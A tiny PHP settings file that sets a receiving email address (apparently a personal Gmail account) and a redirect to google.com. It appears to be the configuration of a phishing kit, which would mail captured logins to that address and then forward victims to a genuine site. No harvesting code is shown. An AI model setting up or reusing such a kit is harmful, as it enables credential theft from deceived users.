<?php 
$Receive_email="brown.goodrich54@gmail.com";
$redirect="https://www.google.com/";
?>